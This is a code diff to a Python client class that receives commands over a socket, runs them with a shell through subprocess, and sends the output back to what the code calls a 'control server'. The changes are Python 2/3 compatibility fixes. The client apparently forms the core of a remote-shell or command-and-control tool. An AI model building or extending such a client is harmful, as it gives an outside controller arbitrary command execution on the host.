@@ -69,7 +69,7 @@ class Client(object):
         if echo:
             print('Sending Data:', some_data)
         if encode:
-            self.sock.send(str.encode(some_data + '~!_TERM_$~'))
+            self.sock.send(str.encode(str(some_data + '~!_TERM_$~')))
         else:
             self.sock.send(some_data)
             self.sock.send(str.encode('~!_TERM_$~'))
@@ -388,18 +388,30 @@ class Client(object):
                         continue
 
                 # Process the command.
-                cmd = subprocess.Popen(
-                    data[:],
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    timeout=600
-                )
+                try:
+                    cmd = subprocess.Popen(
+                        data[:],
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        stdin=subprocess.PIPE,
+                        timeout=600
+                    )
+                except TypeError:
+                    cmd = subprocess.Popen(
+                        data[:],
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        stdin=subprocess.PIPE
+                    )
 
                 # Compile the output.
                 output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                output_str = str(output_bytes, 'utf-8')
+                try:
+                    output_str = str(output_bytes, 'utf-8')
+                except TypeError:
+                    output_str = str(output_bytes.decode('utf-8'))
 
                 print('Output Str: {}'.format(output_str))
                 # Send the output back to control server.
